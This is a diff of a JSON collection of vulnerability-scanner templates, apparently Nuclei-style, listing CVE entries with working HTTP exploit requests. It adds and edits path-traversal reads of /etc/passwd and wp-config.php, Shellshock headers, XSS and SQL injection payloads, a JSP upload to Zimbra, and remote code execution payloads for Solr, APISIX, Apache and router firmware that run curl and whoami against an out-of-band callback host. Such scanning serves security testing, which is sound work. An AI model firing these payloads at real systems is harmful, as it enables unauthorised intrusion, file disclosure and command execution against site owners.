@@ -208,6 +208,36 @@
       ]
     },
     {
+      "id": "CVE-2008-1059",
+      "info": {
+        "name": "WordPress Sniplets 1.1.2 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2008-1061",
+      "info": {
+        "name": "Wordpress Plugin Sniplets 1.2.2 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-2398",
       "info": {
         "name": "AppServ Open Project <=2.5.10 - Cross-Site Scripting",
@@ -3015,17 +3045,24 @@
     {
       "id": "CVE-2014-2383",
       "info": {
-        "name": "Arbitrary file read in dompdf < v0.6.0",
+        "name": "Dompdf < v0.6.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/dompdf.php?input_file=dompdf.php",
-            "{{BaseURL}}/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php",
-            "{{BaseURL}}/lib/dompdf/dompdf.php?input_file=dompdf.php",
-            "{{BaseURL}}/includes/dompdf/dompdf.php?input_file=dompdf.php"
+            "{{BaseURL}}/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd",
+            "{{BaseURL}}/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd"
           ]
         }
       ]
@@ -3354,9 +3391,9 @@
       "requests": [
         {
           "headers": {
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3428,6 +3465,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-9119",
+      "info": {
+        "name": "WordPress DB Backup <=4.5 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php"
           ]
         }
       ]
@@ -3582,6 +3634,36 @@
       ]
     },
     {
+      "id": "CVE-2015-1000005",
+      "info": {
+        "name": "WordPress Candidate Application Form <= 1.3 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-1000010",
+      "info": {
+        "name": "WordPress Simple Image Manipulator < 1.0 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-1000012",
       "info": {
         "name": "WordPress MyPixs <=0.3 - Local File Inclusion",
@@ -3623,6 +3705,22 @@
           "path": [
             "{{BaseURL}}/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd",
             "{{BaseURL}}/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-1579",
+      "info": {
+        "name": "WordPress Slider Revolution - Local File Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+            "{{BaseURL}}/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
           ]
         }
       ]
@@ -3813,6 +3911,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-4127",
+      "info": {
+        "name": "WordPress Plugin church_admin - Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/church-admin/includes/validate.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -8085,7 +8198,7 @@
         {
           "raw": [
             "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
-            "POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\n\ncommand=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20http://{{interactsh-url}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport\n"
+            "POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\n\ncommand=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20{{interactsh-url}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport\n"
           ]
         }
       ]
@@ -8254,7 +8367,7 @@
       "requests": [
         {
           "raw": [
-            "POST /checkValid HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46cGFzcw==\nContent-Type: application/x-www-form-urlencoded\n\ndocument=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"curl http://{{interactsh-url}}\")\n"
+            "POST /checkValid HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46cGFzcw==\nContent-Type: application/x-www-form-urlencoded\n\ndocument=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"curl {{interactsh-url}}\")\n"
           ]
         }
       ]
@@ -9129,7 +9242,7 @@
           "raw": [
             "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\n",
             "POST /solr/{{core}}/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
-            "GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+            "GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
           ]
         }
       ]
@@ -9634,7 +9747,7 @@
       },
       "requests": [
         {
-          "body": "file_transfer=new&dir=%27Pa_Noteexpr%20curl%2bhttp%3a//{{interactsh-url}}Pa_Note%27",
+          "body": "file_transfer=new&dir=%27Pa_Noteexpr%20curl%2b{{interactsh-url}}Pa_Note%27",
           "headers": {
             "Content-Type": "application/x-www-form-urlencoded"
           },
@@ -11807,9 +11920,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -13602,7 +13715,7 @@
       "requests": [
         {
           "raw": [
-            "POST /cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users HTTP/1.1\nHost: {{Hostname}}\n\n\"name\":\"';$(curl http://{{interactsh-url}});'\",\n\"email\":\"a@b.c\"\n"
+            "POST /cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users HTTP/1.1\nHost: {{Hostname}}\n\n\"name\":\"';$(curl {{interactsh-url}});'\",\n\"email\":\"a@b.c\"\n"
           ]
         }
       ]
@@ -14139,6 +14252,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24165",
+      "info": {
+        "name": "Ninja Forms < 3.4.34 - Administrator Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin-ajax.php?client_id=1&redirect=https://interact.sh&action=nf_oauth_connect HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -14715,14 +14843,15 @@
     {
       "id": "CVE-2021-24838",
       "info": {
-        "name": "AnyComment <= 0.2.21 - Open Redirect",
+        "name": "AnyComment < 0.3.5 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh"
+            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh",
+            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh?a=https://interact.sh"
           ]
         }
       ]
@@ -14986,7 +15115,7 @@
     {
       "id": "CVE-2021-25112",
       "info": {
-        "name": "WordPress WHMCS Bridge < 6.4b -  Cross-Site Scripting",
+        "name": "WHMCS Bridge < 6.4b - Cross-Site Scripting (XSS)",
         "severity": "medium"
       },
       "requests": [
@@ -16107,6 +16236,21 @@
       ]
     },
     {
+      "id": "CVE-2021-32789",
+      "info": {
+        "name": "WooCommerce Blocks 2.5 to 5.5 - Unauthenticated SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-32819",
       "info": {
         "name": "Nodejs Squirrelly - Remote Code Execution",
@@ -16218,7 +16362,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20http://{{interactsh-url}}/`whoami`;"
+            "{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;"
           ]
         }
       ]
@@ -16460,8 +16604,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -17448,8 +17592,8 @@
       "requests": [
         {
           "raw": [
-            "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
-            "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo COP-37714-1202-EVC | rev\n"
+            "GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; {{cmd}}\n"
           ]
         }
       ]
@@ -17522,9 +17666,9 @@
       "requests": [
         {
           "raw": [
-            "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
+            "GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
             "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
-            "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo 31024-1202-EVC | rev\n\n"
+            "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\necho Echo: CVE-2021-42013; echo; {{cmd}};\n\n"
           ]
         }
       ]
@@ -17661,6 +17805,21 @@
         {
           "raw": [
             "POST /cas/v1/tickets/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42627",
+      "info": {
+        "name": "D-Link DIR-615 - Unauthorized Access",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wan.htm"
           ]
         }
       ]
@@ -18222,6 +18381,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0150",
+      "info": {
+        "name": "WP Accessibility Helper (WAH) < 0.6.0.7 - Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0165",
       "info": {
         "name": "WordPress Page Builder KingComposer <=2.9.6 - Open Redirect",
@@ -18292,6 +18466,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?rest_route=/whm/v3/themesettings"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0220",
+      "info": {
+        "name": "WordPress GDPR & CCPA < 1.9.27 - Unauthenticated Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-admin HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onload%3dalert(document.domain)%3e&nonce={{nonce}}\n"
           ]
         }
       ]
@@ -18819,6 +19008,36 @@
       ]
     },
     {
+      "id": "CVE-2022-1390",
+      "info": {
+        "name": "WordPress Admin Word Count Column 2.2 - Local File Inclusion",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1391",
+      "info": {
+        "name": "WordPress Cab fare calculator < 1.0.4 - Local File Inclusion",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1392",
       "info": {
         "name": "WordPress Videos sync PDF <=1.7.4 - Local File Inclusion",
@@ -19316,7 +19535,7 @@
       "requests": [
         {
           "raw": [
-            "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\",\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl https://{{interactsh-url}}/`whoami`'); return true end\\\"}\"\n    }\n  ]\n}\n",
+            "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\",\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl {{interactsh-url}}/`whoami`'); return true end\\\"}\"\n    }\n  ]\n}\n",
             "GET /api/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n"
           ]
         }
@@ -20454,6 +20673,20 @@
       ]
     },
     {
+      "id": "CVE-2022-35151",
+      "info": {
+        "name": "kkFileView v4.1.0 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /picturesPreview?urls=aHR0cDovLzEyNy4wLjAuMS8xLnR4dCI%2BPHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4%3D HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-35416",
       "info": {
         "name": "H3C SSL VPN through 2022-07-10 - Cookie Based XSS",
@@ -20508,6 +20741,20 @@
           "raw": [
             "POST {{path}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\n\n{{hex_decode(\"504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000f00000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b05060000000002000200d6000000e00100000000\")}}\n",
             "GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-37153",
+      "info": {
+        "name": "Artica Proxy - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /fw.login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=admin%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n"
           ]
         }
       ]
